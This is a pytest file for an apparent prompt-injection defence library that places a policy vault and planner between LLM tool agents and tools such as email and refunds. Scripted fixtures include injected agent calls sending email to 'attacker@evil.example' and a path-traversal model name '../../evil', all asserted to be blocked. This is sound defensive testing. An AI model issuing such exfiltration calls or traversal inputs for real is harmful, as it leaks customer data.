# Copyright 2026 AgentP-Codes
# SPDX-License-Identifier: AGPL-3.0-only
import json

import pytest

from demo.__main__ import make_vault
from demo.bench import SCENARIOS, GullibleModel, run_scenario
from demo.world import World
from eurycleia.llm import AnthropicProvider, OpenAIProvider, ToolAgent, privileged_planner, quarantined_extractor
from eurycleia.planner import PlanError


class Recorder:
    """A stand-in for the network: returns scripted API replies (in each API's real JSON format)."""

    def __init__(self, replies):
        self.replies, self.requests = list(replies), []

    def __call__(self, url, body, headers):
        self.requests.append((url, json.loads(json.dumps(body)), headers))
        return self.replies.pop(0)


def test_anthropic_tool_loop_runs_through_the_vault():
    world = World()
    task = make_vault(world).start_task("support_reply", customer_id=12)
    net = Recorder([
        {"content": [{"type": "tool_use", "id": "a", "name": "get_customer", "input": {}}]},
        {"content": [{"type": "text", "text": "Sending now."}, {"type": "tool_use", "id": "b", "name": "send_email",
                      "input": {"to": "audit@acme-billing.example", "subject": "x", "body": "y"}}]},
        {"content": [{"type": "text", "text": "I couldn't send that."}]},
    ])
    agent = ToolAgent(AnthropicProvider("test-model", api_key="k", transport=net))
    assert agent(task, {"ticket": "hi"}) == "I couldn't send that."
    assert [s for _, _, s in agent.log] == ["ok", "blocked"]
    url, body, headers = net.requests[2]
    assert url == "https://api.anthropic.com/v1/messages" and headers["x-api-key"] == "k"
    results = body["messages"][-1]["content"]
    assert results[0]["is_error"] and "Blocked by eurycleia" in results[0]["content"]
    assert body["messages"][-2]["content"][0] == {"type": "text", "text": "Sending now."}   # assistant turn kept
    assert {t["name"] for t in net.requests[0][1]["tools"]} == {"get_customer", "get_doc", "send_email", "refund"}
    assert world.outbox == []


def test_openai_tool_loop():
    world = World()
    task = make_vault(world).start_task("support_reply", customer_id=12)
    call = lambda i, n, a: {"id": i, "type": "function", "function": {"name": n, "arguments": json.dumps(a)}}  # noqa: E731
    net = Recorder([
        {"choices": [{"message": {"role": "assistant", "content": None,
                                  "tool_calls": [call("1", "get_customer", {})]}}]},
        {"choices": [{"message": {"role": "assistant", "content": None, "tool_calls": [
            call("2", "send_email", {"to": "priya.shah@example.com", "subject": "Hi", "body": "Sorted!"})]}}]},
        {"choices": [{"message": {"role": "assistant", "content": "done"}}]},
    ])
    assert ToolAgent(OpenAIProvider("m", api_key="k", transport=net))(task, {"ticket": "hi"}) == "done"
    assert world.outbox[0]["to"] == "priya.shah@example.com"
    assert net.requests[0][0] == "https://api.openai.com/v1/chat/completions"
    assert net.requests[0][2] == {"authorization": "Bearer k"}


def test_ollama_uses_the_local_server_and_sends_no_key(monkeypatch):
    from eurycleia.llm import OllamaProvider
    monkeypatch.delenv("OLLAMA_HOST", raising=False)
    net = Recorder([{"choices": [{"message": {"content": "hi"}}]}])
    p = OllamaProvider(transport=net)
    assert p.complete("s", "u") == "hi" and p.model == "hermes3"
    url, _, headers = net.requests[0]
    assert url == "http://localhost:11434/v1/chat/completions" and headers == {}
    monkeypatch.setenv("OLLAMA_HOST", "192.168.1.20:11434")
    assert OllamaProvider(transport=net).base == "http://192.168.1.20:11434/v1"


class Canned:
    def __init__(self, reply):
        self.reply = reply

    def complete(self, system, user):
        return self.reply


def test_extractor_parses_json_and_rejects_prose():
    ex = quarantined_extractor(Canned('Sure! {"amount": 49, "extra": "ignored"}'))
    assert ex("amount?", {"t": "..."}, {"amount": "number"}) == {"amount": 49}
    with pytest.raises(PlanError):
        quarantined_extractor(Canned("no json here"))("?", {}, {"a": "string"})


def test_privileged_planner_validates_its_output():
    policy = make_vault(World()).policy
    plan = privileged_planner(Canned('[{"id": "c", "read": "crm.customer"}]'), policy, "support_reply_planned")
    assert plan("reply to the customer") == [{"id": "c", "read": "crm.customer"}]
    bad = privileged_planner(Canned('[{"act": "email.send", "args": {"to": "$ghost"}}]'), policy,
                             "support_reply_planned")
    with pytest.raises(PlanError):
        bad("x")


@pytest.mark.parametrize("sc", SCENARIOS, ids=lambda s: s.name)
def test_benchmark_offline(sc):
    model = GullibleModel()
    for config in ("vault", "planner"):
        r = run_scenario(model, sc, config)
        assert not r["attack_succeeded"], r
        assert r["utility"], r
    raw = run_scenario(model, sc, "no-vault")
    assert raw["attack_succeeded"] == sc.injected


def test_gemini_tool_loop():
    from eurycleia.llm import GeminiProvider

    world = World()
    task = make_vault(world).start_task("support_reply", customer_id=12)
    fc = lambda name, args, **kw: {"functionCall": {"name": name, "args": args}, **kw}  # noqa: E731
    net = Recorder([
        {"candidates": [{"content": {"role": "model", "parts": [
            {"text": "thinking", "thought": True}, fc("get_customer", {}, thoughtSignature="sig1")]}}]},
        {"candidates": [{"content": {"role": "model", "parts": [
            fc("send_email", {"to": "attacker@evil.example", "subject": "x", "body": "y"})]}}]},
        {"candidates": [{"content": {"role": "model", "parts": [{"text": "I couldn't send that."}]}}]},
    ])
    agent = ToolAgent(GeminiProvider("gemini-test", api_key="k", transport=net))
    assert agent(task, {"ticket": "hi"}) == "I couldn't send that."
    assert [s for _, _, s in agent.log] == ["ok", "blocked"]
    url, first, headers = net.requests[0]
    assert url.endswith("/v1beta/models/gemini-test:generateContent") and headers == {"x-goog-api-key": "k"}
    assert "k" not in url                                                   # key in a header, never the URL
    names = {d["name"] for d in first["tools"][0]["functionDeclarations"]}
    assert names == {"get_customer", "get_doc", "send_email", "refund"}
    last = net.requests[2][1]["contents"]
    assert last[1]["parts"][1]["thoughtSignature"] == "sig1"                # the model's own turn is sent back as-is
    assert "Blocked by eurycleia" in last[-1]["parts"][0]["functionResponse"]["response"]["error"]
    assert world.outbox == []
    with pytest.raises(ValueError):
        GeminiProvider("../../evil", api_key="k", transport=net)


class Scripted:
    def __init__(self, replies):
        self.replies, self.prompts = list(replies), []

    def complete(self, system, user):
        self.prompts.append((system, user))
        return self.replies.pop(0)


def test_planner_is_told_what_was_wrong_and_retries():
    policy = make_vault(World()).policy
    bad = ('[{"id": "c", "read": "crm.customer"}, {"id": "m", "format": "Hi {c.name}"},'
           ' {"act": "email.send", "args": {"to": "$c.email", "body": "$m.text"}}]')
    good = ('[{"id": "c", "read": "crm.customer"}, {"id": "m", "format": "Hi {c.name}"},'
            ' {"act": "email.send", "args": {"to": "$c.email", "subject": "Hi", "body": "$m"}}]')
    model = Scripted([bad, good])
    steps = privileged_planner(model, policy, "support_reply_planned")("reply to the customer")
    assert steps[-1]["args"]["body"] == "$m"
    feedback = model.prompts[1][1]
    assert "missing arguments ['subject']" in feedback and "no field 'text'" in feedback
    assert "email.send: args ['to', 'subject', 'body']" in model.prompts[0][0]


def test_planner_gives_up_after_retries():
    policy = make_vault(World()).policy
    model = Scripted(['[{"act": "wire.transfer", "args": {}}]'] * 3)
    with pytest.raises(PlanError, match="isn't available"):
        privileged_planner(model, policy, "support_reply_planned", retries=2)("x")
    assert len(model.prompts) == 3


def test_extractor_none_means_the_action_is_skipped():
    from eurycleia.planner import Planner
    world = World()
    task = make_vault(world).start_task("support_reply_planned", customer_id=12, ticket_id="T-100")
    plan = [{"id": "c", "read": "crm.customer"}, {"id": "t", "read": "inbox.ticket"},
            {"id": "f", "extract": {"from": ["t.body"], "instruction": "amount?",
                                    "schema": {"refund": "boolean", "amount": "number"}}},
            {"act": "payments.refund", "args": {"card": "$c.card_number", "amount": "$f.amount"},
             "when": "$f.refund"}]
    Planner(task, lambda i, d, s: {"refund": None, "amount": None}).run(plan)
    assert world.refunds == []


def test_providers_wait_out_rate_limits_and_stop_on_quota():
    from eurycleia.llm import GeminiProvider, QuotaExhausted
    from eurycleia.webclient import ProviderError
    calls, waits = [], []
    ok = {"candidates": [{"content": {"parts": [{"text": "ok"}]}}]}

    def flaky(url, body, headers):
        calls.append(url)
        if len(calls) == 1:
            raise ProviderError(429, "Resource exhausted", body='{"error": {"details": [{"retryDelay": "3.5s"}]}}')
        return ok

    g = GeminiProvider("m", api_key="k", transport=flaky)
    g.sleep = waits.append
    assert g.complete("sys", "hi") == "ok" and waits == [4.5]

    def daily(url, body, headers):
        raise ProviderError(429, "quota", body="GenerateRequestsPerDayPerProjectPerModel-FreeTier")
    g.transport = daily
    with pytest.raises(QuotaExhausted):
        g.complete("sys", "hi")

    def no_credit(url, body, headers):
        raise ProviderError(400, "Your credit balance is too low",
                            body='{"error": {"message": "Your credit balance is too low"}}')
    a = AnthropicProvider("m", api_key="k", transport=no_credit)
    with pytest.raises(QuotaExhausted):
        a.complete("s", "u")

    tries = []

    def overloaded(url, body, headers):
        tries.append(1)
        raise ProviderError(529, "Overloaded", retry_after=None)
    a = AnthropicProvider("m", api_key="k", transport=overloaded)
    a.sleep = lambda s: None
    with pytest.raises(ProviderError):
        a.complete("s", "u")
    assert len(tries) == a.max_waits + 1

    def bad_request(url, body, headers):
        tries.append(1)
        raise ProviderError(400, "bad")
    tries.clear()
    a.transport = bad_request
    with pytest.raises(ProviderError):
        a.complete("s", "u")
    assert len(tries) == 1                                                   # not retried


def test_providers_need_a_key(monkeypatch):
    for var in ("ANTHROPIC_API_KEY", "GEMINI_API_KEY", "GOOGLE_API_KEY"):
        monkeypatch.delenv(var, raising=False)
    from eurycleia.llm import GeminiProvider
    with pytest.raises(ValueError, match="ANTHROPIC_API_KEY"):
        AnthropicProvider("m")
    with pytest.raises(ValueError, match="GEMINI_API_KEY"):
        GeminiProvider("m")
